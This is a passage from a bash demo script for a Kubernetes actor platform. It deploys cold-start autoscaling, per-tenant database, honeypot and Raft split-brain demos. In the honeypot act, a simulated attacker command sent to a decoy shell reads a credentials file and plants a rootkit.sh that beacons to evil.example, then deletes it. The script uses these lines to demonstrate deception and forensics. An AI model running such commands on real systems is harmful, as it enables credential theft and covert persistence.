    if [[ -n "${SUBSTRATE_ROOT:-}" && -d "${SUBSTRATE_ROOT}" ]]; then
      echo "Building kubectl-ate container image from ${SUBSTRATE_ROOT}..."
      KUBECTL_ATE_IMAGE="$(
        cd "${SUBSTRATE_ROOT}"
        KO_CONFIG_PATH="${REPO_ROOT}/.ko.yaml" ko build ./cmd/kubectl-ate --platform=linux/amd64
      )"
    else
      echo "ERROR: Set KUBECTL_ATE_IMAGE or SUBSTRATE_ROOT to deploy coldstart-gateway." >&2
      exit 1
    fi
  fi
  export KUBECTL_ATE_IMAGE

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/coldstart-hpa.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/coldstart-k8s -n anything-but-agents --timeout=120s
  kubectl rollout status deployment/coldstart-k8s-router -n anything-but-agents --timeout=120s
  kubectl rollout status deployment/coldstart-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc coldstart-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Cold-Start HPA Dashboard (HTTPS) : https://coldstart.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret coldstart-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Cold-Start HPA Dashboard (LB IP) : http://${lb_ip:-<pending>}/dashboard?key=\$(kubectl get secret coldstart-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""
  kubectl get hpa -n anything-but-agents
}

cleanup_coldstart_hpa() {
  banner "Cleaning up Cold-Start HPA Comparison Stack & Actors"
  for act in coldstart-1 coldstart-2 coldstart-3 clone-1 clone-2 clone-3; do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete hpa coldstart-k8s coldstart-substrate -n anything-but-agents --ignore-not-found
  kubectl delete deployment,service coldstart-k8s coldstart-k8s-router coldstart-gateway -n anything-but-agents --ignore-not-found
  kubectl delete secret coldstart-gateway -n anything-but-agents --ignore-not-found
  kubectl delete deployment coldstart-substrate-pool -n anything-but-agents --ignore-not-found
  kubectl delete serviceaccount,role,rolebinding coldstart-gateway coldstart-gateway-ns -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding coldstart-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding coldstart-gateway-cluster coldstart-gateway-auth-delegator --ignore-not-found
  kubectl delete apiservice v1beta1.external.metrics.k8s.io --ignore-not-found
  free_workers
}

act2_coldstart() {
  ensure_router_port_forward
  banner "ACT II: 'The Instant Cloner & Production HPA QPS Race' — 12s Cold-Start Index vs. 100ms Golden Snapshot Clones"
  reset_act_resources clone-1 clone-2 clone-3 coldstart-1 coldstart-2 coldstart-3

  step "1. Create 3 search engine actors from 'coldstart' template (whose Golden Snapshot already built the 50,000-doc trigram index in 12s)"
  run_cmd kubectl ate create actor coldstart-1 -a "${ATESPACE}" --template coldstart
  run_cmd kubectl ate create actor coldstart-2 -a "${ATESPACE}" --template coldstart
  run_cmd kubectl ate create actor coldstart-3 -a "${ATESPACE}" --template coldstart

  step "2. Query coldstart-1 & coldstart-2 — both wake in ~100ms with the SAME golden_heap_fingerprint, 50,000 indexed docs (~65MB RAM), and isolated overlays!"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/coldstart-1" "${ROUTER_URL}/search?q=kubernetes+horizontal+pod+autoscaler&add_symbol=user_a_module"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/coldstart-2" "${ROUTER_URL}/search?q=gvisor+memory+snapshot+restore&add_symbol=user_b_module"

  step "3. Suspend coldstart-2 and coldstart-3 to GCS (\$0 idle compute) so our HPA pool starts at 1/3 active replicas (20 QPS capacity)"
  run_cmd kubectl ate suspend actor coldstart-2 -a "${ATESPACE}"
  run_cmd kubectl ate suspend actor coldstart-3 -a "${ATESPACE}"

  local cs_port="${COLDSTART_PORT:-8091}"
  local cs_url="http://localhost:${cs_port}"
  local cluster_lb_ip=""
  local presenter_token=""
  presenter_token="$(kubectl get secret coldstart-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  if [[ -z "${presenter_token}" ]]; then
    presenter_token="$(openssl rand -hex 24)"
  fi
  cluster_lb_ip="$(kubectl get svc coldstart-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"

  if [[ -n "${cluster_lb_ip}" ]] && curl -s -o /dev/null --connect-timeout 2 "http://${cluster_lb_ip}/readyz" 2>/dev/null; then
    cs_url="http://${cluster_lb_ip}"
    echo "Using in-cluster Cold-Start HPA & Production QPS Comparison Gateway at ${cs_url}..."
  else
    echo "Starting Cold-Start HPA & Production QPS Comparison Gateway on ${cs_url}..."
    (
      cd "${REPO_ROOT}"
      PRESENTER_TOKEN="${presenter_token}" go run ./cmd/coldstart \
        --mode=gateway \
        --addr=":${cs_port}" \
        --metrics-addr="" \
        --atespace="${ATESPACE}" \
        --template=coldstart \
        --router-url="${ROUTER_URL}" \
        --init-delay=12s \
        --min-query-duration=200ms \
        --max-concurrent=4 >/dev/null 2>&1
    ) &
    GATEWAY_PID=$!
    trap 'kill "${PORT_FORWARD_PID:-}" "${GATEWAY_PID:-}" 2>/dev/null || true' EXIT

    for _ in {1..40}; do
      if curl -s -o /dev/null --connect-timeout 1 "${cs_url}/readyz" 2>/dev/null; then
        break
      fi
      sleep 0.3
    done
  fi

  echo ""
  echo "  Live HPA & Production QPS Dashboard : ${cs_url}/dashboard?key=${presenter_token}"
  echo ""

  step "4. PRODUCTION HPA QPS RACE: Trigger a 60 QPS Traffic Spike (minReplicas: 1 -> maxReplicas: 3, 20 QPS/replica cap)"
  curl -fsS -H "X-Presenter-Key: ${presenter_token}" -X POST "${cs_url}/api/spike?baseline_qps=15&spike_qps=60&baseline_sec=2&spike_sec=18&cooldown_sec=2" >/dev/null

  printf "\n  %-4s | %-22s | %-18s | %-20s | %-18s | %-20s\n" \
    "SEC" "PHASE (DEMAND)" "K8S HPA (READY)" "K8S GOODPUT / SHED" "SUB HPA (ACTIVE)" "SUB GOODPUT / SHED"
  printf "  %s\n" "------------------------------------------------------------------------------------------------------------------------"

  for ((sec = 1; sec <= 21; sec++)); do
    sleep 1
    local snap
    snap="$(curl -fsS -H "X-Presenter-Key: ${presenter_token}" "${cs_url}/api/state" 2>/dev/null || true)"
    if [[ -n "${snap}" ]]; then
      local phase k8s_des k8s_rdy k8s_good k8s_shed sub_des sub_rdy sub_good sub_shed
      phase="$(awk -F'"' '/"scenario_phase":/ {print $4; exit}' <<< "${snap}")"
      k8s_des="$(awk '/"hpa_desired_replicas":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      k8s_rdy="$(awk '/"ready_replicas":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      k8s_good="$(awk '/"goodput_qps":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      k8s_shed="$(awk '/"shed_qps":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      sub_des="$(awk '/"substrate":/ {in_sub=1} in_sub && /"hpa_desired_replicas":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      sub_rdy="$(awk '/"substrate":/ {in_sub=1} in_sub && /"ready_replicas":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      sub_good="$(awk '/"substrate":/ {in_sub=1} in_sub && /"goodput_qps":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      sub_shed="$(awk '/"substrate":/ {in_sub=1} in_sub && /"shed_qps":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      printf "  %2ds  | %-22s | %s/%s Ready (%2d QPS) | %5s OK / %5s 429 | %s/%s Ready (%2d QPS) | %5s OK / %5s 429\n" \
        "${sec}" "${phase}" \
        "${k8s_rdy:-1}" "${k8s_des:-1}" "$(( ${k8s_rdy:-1} * 20 ))" "${k8s_good:-0}" "${k8s_shed:-0}" \
        "${sub_rdy:-1}" "${sub_des:-1}" "$(( ${sub_rdy:-1} * 20 ))" "${sub_good:-0}" "${sub_shed:-0}"
    fi
  done

  echo ""
  local final_snap k8s_tot sub_tot k8s_drop sub_drop mult extra
  final_snap="$(curl -fsS -H "X-Presenter-Key: ${presenter_token}" "${cs_url}/api/state" 2>/dev/null || true)"
  k8s_tot="$(awk '/"total_goodput":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"
  k8s_drop="$(awk '/"total_shed":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"
  sub_tot="$(awk '/"substrate":/ {in_sub=1} in_sub && /"total_goodput":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"
  sub_drop="$(awk '/"substrate":/ {in_sub=1} in_sub && /"total_shed":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"
  mult="$(awk '/"goodput_multiplier":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"
  extra="$(awk '/"extra_queries_served":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"

  echo "  ================================================================================"
  echo "  PRODUCTION HPA + COLD-START SCORECARD (minReplicas: 1 -> maxReplicas: 3)"
  echo "  --------------------------------------------------------------------------------"
  echo "  Standard K8s HPA (12s Cold-Start Pods) : ${k8s_tot:-0} searches served (200 OK) | ${k8s_drop:-0} shed (429)"
  echo "  Agent Substrate HPA (~100ms Snapshot)  : ${sub_tot:-0} searches served (200 OK) | ${sub_drop:-0} shed (429)"
  echo "  Production QPS Advantage               : ${mult:-1.0}x effective goodput (+${extra:-0} extra queries served!)"
  echo "  ================================================================================"

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> Cold-Start HPA Dashboard (${cs_url}/dashboard?key=${presenter_token}) is still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${GATEWAY_PID:-}" 2>/dev/null || true
  free_workers
}

act3_tenantdb() {
  ensure_router_port_forward
  banner "ACT III: 'One Database Per Customer' — DurableDir + 16MB Hot RAM Pause (FULL) vs. Compact GCS Commit (DATA)"
  reset_act_resources db-acme db-globex db-initech db-umbrella

  local tdb_port="${TENANTDB_PORT:-8086}"
  local tdb_url="http://localhost:${tdb_port}"
  local cluster_lb_ip=""
  local presenter_token=""
  presenter_token="$(kubectl get secret tenantdb-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  cluster_lb_ip="$(kubectl get svc tenantdb-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"

  if [[ -n "${cluster_lb_ip}" ]] && curl -s -o /dev/null --connect-timeout 2 "http://${cluster_lb_ip}/readyz" 2>/dev/null; then
    tdb_url="http://${cluster_lb_ip}"
    echo "Using in-cluster TenantDB Storage & Memory Tiering Console at ${tdb_url}..."
  else
    echo "Starting TenantDB Storage & Memory Tiering Console on ${tdb_url}..."
    (
      cd "${REPO_ROOT}"
      PRESENTER_TOKEN="${presenter_token}" go run ./cmd/tenantdb \
        --mode=gateway \
        --addr=":${tdb_port}" \
        --atespace="${ATESPACE}" \
        --template=tenantdb \
        --router-url="${ROUTER_URL}" >/dev/null 2>&1
    ) &
    TENANTDB_GW_PID=$!
    trap 'kill "${PORT_FORWARD_PID:-}" "${TENANTDB_GW_PID:-}" 2>/dev/null || true' EXIT

    for _ in {1..30}; do
      if curl -s -o /dev/null --connect-timeout 1 "${tdb_url}/readyz" 2>/dev/null; then
        break
      fi
      sleep 0.3
    done
  fi

  echo ""
  if [[ -n "${presenter_token}" ]]; then
    echo "  TenantDB Storage & Memory X-Ray Console : ${tdb_url}/dashboard?key=${presenter_token}"
  else
    echo "  TenantDB Storage & Memory X-Ray Console : ${tdb_url}/dashboard"
  fi
  echo ""

  step "1. Create isolated single-tenant database actors: 'db-acme' (Acme Corp) and 'db-globex' (Globex Logistics)"
  run_cmd kubectl ate create actor db-acme -a "${ATESPACE}" --template tenantdb
  run_cmd kubectl ate create actor db-globex -a "${ATESPACE}" --template tenantdb

  step "2. Insert SaaS rows into both tenants' DurableDir (/data/wal.jsonl) and warm their 16.0 MB RAM Buffer Pools"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/?table=subscriptions&key=tier&val=enterprise&amount=48000"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/?table=settings&key=region&val=us-west3-slc"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-globex" "${ROUTER_URL}/?table=subscriptions&key=tier&val=freight-scale&amount=32000"

  step "3. PAUSE db-acme (suspend --mode=async) -> query it: HOT_RAM_RESUME! Both /data/wal.jsonl AND 16.0 MB RAM Buffer Pool survive intact (0 WAL replayed)"
  run_cmd kubectl ate suspend actor db-acme -a "${ATESPACE}" --mode=async
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/"

  step "4. SUSPEND db-acme (suspend --mode=sync) -> query it: COLD_DATA_REPLAY! 16.0 MB RAM heap discarded (99.997% GCS saved); /data/wal.jsonl replayed in <1ms"
  run_cmd kubectl ate suspend actor db-acme -a "${ATESPACE}" --mode=sync
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/?resume_hint=suspend_data"

  step "5. GDPR Article 17 Right-to-be-Forgotten: delete tenant 'db-acme' in 1 command, then verify sibling 'db-globex' is 100% intact!"
  run_cmd kubectl ate delete actor db-acme -a "${ATESPACE}"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-globex" "${ROUTER_URL}/"

  echo ""
  echo "  ================================================================================"
  echo "  PER-TENANT DATABASE STORAGE TIERING & GDPR SCORECARD"
  echo "  --------------------------------------------------------------------------------"
  echo "  Short Idle (onPause: FULL)   : 16.0 MB Hot RAM Buffer Pool + /data/wal.jsonl intact (0 WAL replayed)"
  echo "  Long Idle  (onCommit: DATA)  : 16.0 MB RAM discarded; ~320 B /data/wal.jsonl committed (99.997% GCS saved)"
  echo "  GDPR Right-to-be-Forgotten   : 'db-acme' compute + snapshots + DurableDir shredded; 'db-globex' 100% online"
  echo "  ================================================================================"

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> TenantDB Storage & Memory Tiering Console (${tdb_url}/dashboard) is still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${TENANTDB_GW_PID:-}" 2>/dev/null || true
  free_workers
}

deploy_tenantdb_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster TenantDB Storage & Memory Tiering Gateway & LoadBalancer"

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  reset_act_resources db-acme db-globex db-initech db-umbrella
  free_workers

  if ! kubectl get secret tenantdb-gateway -n anything-but-agents >/dev/null 2>&1; then
    kubectl create secret generic tenantdb-gateway \
      -n anything-but-agents \
      --from-literal=PRESENTER_TOKEN="$(openssl rand -hex 24)"
  fi

  ensure_template_ready tenantdb

  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
    KUBECTL_ATE_IMAGE="$(kubectl get deployment dungeon2d-gateway -n anything-but-agents -o jsonpath='{.spec.template.spec.initContainers[0].image}' 2>/dev/null || true)"
  fi
  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
    if [[ -n "${SUBSTRATE_ROOT:-}" && -d "${SUBSTRATE_ROOT}" ]]; then
      echo "Building kubectl-ate container image from ${SUBSTRATE_ROOT}..."
      KUBECTL_ATE_IMAGE="$(
        cd "${SUBSTRATE_ROOT}"
        KO_CONFIG_PATH="${REPO_ROOT}/.ko.yaml" ko build ./cmd/kubectl-ate --platform=linux/amd64
      )"
    else
      echo "ERROR: Set KUBECTL_ATE_IMAGE or SUBSTRATE_ROOT to deploy tenantdb-gateway." >&2
      exit 1
    fi
  fi
  export KUBECTL_ATE_IMAGE

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/tenantdb-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/tenantdb-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc tenantdb-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  TenantDB Storage X-Ray Console (HTTPS) : https://tenantdb.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret tenantdb-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  TenantDB Storage X-Ray Console (LB IP) : http://${lb_ip:-<pending>}/dashboard?key=\$(kubectl get secret tenantdb-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""
}

cleanup_tenantdb_gateway() {
  banner "Cleaning up TenantDB Gateway Deployment & Actors"
  for act in db-acme db-globex db-initech db-umbrella; do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,secret,serviceaccount tenantdb-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding tenantdb-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding tenantdb-gateway-ate-client --ignore-not-found
  free_workers
}

act4_honeypot() {
  ensure_router_port_forward
  banner "ACT IV: 'The Truman Show Honeypot' — On-Demand Per-Attacker gVisor Deception"
  reset_act_resources honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab
  kubectl ate delete tag tag-honeypot-forensic -a "${ATESPACE}" 2>/dev/null || true

  local honeypot_port="${HONEYPOT_PORT:-8084}"
  local honeypot_url="http://localhost:${honeypot_port}"

  echo "Starting Truman Show Split-Screen Honeypot UI on ${honeypot_url}..."
  (
    cd "${REPO_ROOT}"
    go run ./cmd/honeypot \
      --mode=gateway \
      --addr=":${honeypot_port}" \
      --atespace="${ATESPACE}" \
      --template=honeypot \
      --router-url="${ROUTER_URL}" >/dev/null 2>&1
  ) &
  HONEYPOT_GW_PID=$!
  trap 'kill "${PORT_FORWARD_PID:-}" "${HONEYPOT_GW_PID:-}" 2>/dev/null || true' EXIT

  echo ""
  echo "  Split-Screen Truman Show Director's Booth : ${honeypot_url}"
  echo ""

  step "1. Create gVisor honeypot actors for two suspicious scanner IPs"
  run_cmd kubectl ate create actor honeypot-203-0-113-5 -a "${ATESPACE}" --template honeypot
  run_cmd kubectl ate create actor honeypot-198-51-100-9 -a "${ATESPACE}" --template honeypot

  step "2. Attacker 203.0.113.5 exploits /shell (real sh in gVisor), steals decoy DB creds, and plants /tmp/honeypot/rootkit.sh"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" \
    "${ROUTER_URL}/shell?cmd=id+%26%26+cat+payroll_db_credentials.env.bak+%26%26+echo+'curl+evil.example/beacon'+>+rootkit.sh+%26%26+chmod+%2Bx+rootkit.sh+%26%26+ls+-la"

  step "3. Attacker disconnects -> suspend honeypot-203-0-113-5 to GCS (checkpointing rootkit.sh + RAM forensics at \$0 idle compute)"
  run_cmd kubectl ate suspend actor honeypot-203-0-113-5 -a "${ATESPACE}" --mode=sync

  step "4. Meanwhile, Attacker 198.51.100.9 probes /shell and sees a completely clean Golden Snapshot filesystem"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-198-51-100-9" "${ROUTER_URL}/shell?cmd=ls+-la"

  step "5. Weeks later, Attacker 203.0.113.5 returns (rootkit.sh is still there!) and runs 'rm -f rootkit.sh' to wipe their tracks"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/shell?cmd=ls+-la+%26%26+rm+-f+rootkit.sh+%26%26+ls+-la"

  step "6. SOC Director Reveal: inspect /forensics (Canary Alerts + DELETED rootkit.sh), then REVERT the rm -f wipe to recover the malware!"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/forensics"
  run_cmd kubectl ate revert actor honeypot-203-0-113-5 -a "${ATESPACE}"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/forensics"

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> Truman Show Split-Screen UI (${honeypot_url}) is still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${HONEYPOT_GW_PID:-}" 2>/dev/null || true
  free_workers
}

deploy_honeypot_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster Honeypot Split-Screen Gateway & LoadBalancer"

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  free_workers

  # Ensure ActorTemplate honeypot is rebuilt and Golden Snapshot is READY
  ensure_template_ready honeypot

  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
    KUBECTL_ATE_IMAGE="$(kubectl get deployment dungeon2d-gateway -n anything-but-agents -o jsonpath='{.spec.template.spec.initContainers[0].image}' 2>/dev/null || true)"
  fi
  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
    if [[ -n "${SUBSTRATE_ROOT:-}" && -d "${SUBSTRATE_ROOT}" ]]; then
      echo "Building kubectl-ate container image from ${SUBSTRATE_ROOT}..."
      KUBECTL_ATE_IMAGE="$(
        cd "${SUBSTRATE_ROOT}"
        KO_CONFIG_PATH="${REPO_ROOT}/.ko.yaml" ko build ./cmd/kubectl-ate --platform=linux/amd64
      )"
    else
      echo "ERROR: Set KUBECTL_ATE_IMAGE or SUBSTRATE_ROOT to deploy honeypot-gateway." >&2
      exit 1
    fi
  fi
  export KUBECTL_ATE_IMAGE

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/honeypot-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/honeypot-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc honeypot-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Truman Show Honeypot UI (HTTPS) : https://honeypot.${DEMO_DOMAIN}/"
  echo "  Truman Show Honeypot UI (LB IP) : http://${lb_ip:-<pending>}/"
  echo ""
}

cleanup_honeypot_gateway() {
  banner "Cleaning up Honeypot Gateway Deployment & Actors"
  for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^honeypot-/ {print $2}' || true); do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  for tag in $(kubectl ate get tags -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^tag-(honeypot|forensic)/ {print $2}' || true); do
    kubectl ate delete tag "${tag}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,serviceaccount honeypot-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding honeypot-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding honeypot-gateway-ate-client --ignore-not-found
  free_workers
}

act5_timewarp() {
  ensure_router_port_forward
  banner "ACT V: 'Don't Try This at Home' — 3-Node Raft Split-Brain & Dual-Clock Time-Jump Lab"
  reset_act_resources raft-leader-1 raft-node-1 raft-node-2 raft-node-3

  local tw_port="${TIMEWARP_PORT:-8085}"
  local tw_url="http://localhost:${tw_port}"
  local cluster_lb_ip=""
  cluster_lb_ip="$(kubectl get svc timewarp-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"

  if [[ -n "${cluster_lb_ip}" ]] && curl -s -o /dev/null --connect-timeout 2 "http://${cluster_lb_ip}/readyz" 2>/dev/null; then
    tw_url="http://${cluster_lb_ip}"
    echo "Using in-cluster Chronos Split-Brain & Dual-Clock Lab Gateway at ${tw_url}..."
  else
    echo "Starting Chronos Split-Brain & Dual-Clock Lab Gateway on ${tw_url}..."
    (
      cd "${REPO_ROOT}"
      go run ./cmd/timewarp \
        --mode=gateway \
        --addr=":${tw_port}" \
        --atespace="${ATESPACE}" \
        --template=timewarp \
        --router-url="${ROUTER_URL}" >/dev/null 2>&1
    ) &
    TIMEWARP_GW_PID=$!
    trap 'kill "${PORT_FORWARD_PID:-}" "${TIMEWARP_GW_PID:-}" 2>/dev/null || true' EXIT
  fi

  echo ""
  echo "  Chronos Split-Brain & Dual-Clock Lab UI : ${tw_url}/dashboard"
  echo ""

  step "1. Create 3 consensus actors (raft-node-1..3), elect raft-node-1 as Term 1 LEADER (3s lease), and grant Lock #101 to 'Alice'"
  run_cmd kubectl ate create actor raft-node-1 -a "${ATESPACE}" --template timewarp
  run_cmd kubectl ate create actor raft-node-2 -a "${ATESPACE}" --template timewarp
  run_cmd kubectl ate create actor raft-node-3 -a "${ATESPACE}" --template timewarp
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-1" "${ROUTER_URL}/raft/promote?node_name=raft-node-1&role=LEADER&term=1&leader_id=raft-node-1"
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-1" "${ROUTER_URL}/lock/acquire?owner=Alice+(checkout-svc)&token=101"

  step "2. Suspend Term 1 Leader 'raft-node-1' to GCS for 5 seconds (0 CPU instructions executed; 3s lease expires in the real world!)"
  run_cmd kubectl ate suspend actor raft-node-1 -a "${ATESPACE}" --mode=sync
  echo "Sleeping 5 seconds while raft-node-1 is frozen in GCS — surviving quorum (raft-node-2, raft-node-3) elects raft-node-2 as Term 2 LEADER..."
  sleep 5
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-2" "${ROUTER_URL}/raft/promote?node_name=raft-node-2&role=LEADER&term=2&leader_id=raft-node-2"
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-2" "${ROUTER_URL}/lock/acquire?owner=Bob+(inventory-svc)&token=102"

  step "3. Wake frozen 'raft-node-1' via atenet with a conflicting write ('Mallory') -> ZOMBIE LEADER SPLIT-BRAIN & +500 TOKEN BURST!"
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-1" "${ROUTER_URL}/lock/acquire?owner=Mallory+(rogue-worker)&token=101"

  step "4. Enable Wakeup Clock-Jump Guardrail (?guard=true) -> fences stale lease (409 Conflict) and clamps rate-limiter delta!"
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-1" "${ROUTER_URL}/config?guard=true"

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> Chronos Split-Brain & Dual-Clock Lab UI (${tw_url}/dashboard) is still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${TIMEWARP_GW_PID:-}" 2>/dev/null || true
  free_workers
}

deploy_timewarp_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster Time-Warp Split-Brain & Dual-Clock Lab Gateway & LoadBalancer"
  reset_act_resources raft-leader-1 raft-node-1 raft-node-2 raft-node-3
  free_workers

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true

  ensure_template_ready timewarp

  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
    KUBECTL_ATE_IMAGE="$(kubectl get deployment honeypot-gateway -n anything-but-agents -o jsonpath='{.spec.template.spec.initContainers[0].image}' 2>/dev/null || true)"
  fi
  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
    KUBECTL_ATE_IMAGE="$(kubectl get deployment dungeon2d-gateway -n anything-but-agents -o jsonpath='{.spec.template.spec.initContainers[0].image}' 2>/dev/null || true)"
  fi
  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
    if [[ -n "${SUBSTRATE_ROOT:-}" && -d "${SUBSTRATE_ROOT}" ]]; then
      echo "Building kubectl-ate container image from ${SUBSTRATE_ROOT}..."
      KUBECTL_ATE_IMAGE="$(
        cd "${SUBSTRATE_ROOT}"
        KO_CONFIG_PATH="${REPO_ROOT}/.ko.yaml" ko build ./cmd/kubectl-ate --platform=linux/amd64
      )"
    else
      echo "ERROR: Set KUBECTL_ATE_IMAGE or SUBSTRATE_ROOT to deploy timewarp-gateway." >&2
      exit 1
    fi
  fi
  export KUBECTL_ATE_IMAGE

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/timewarp-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/timewarp-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc timewarp-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
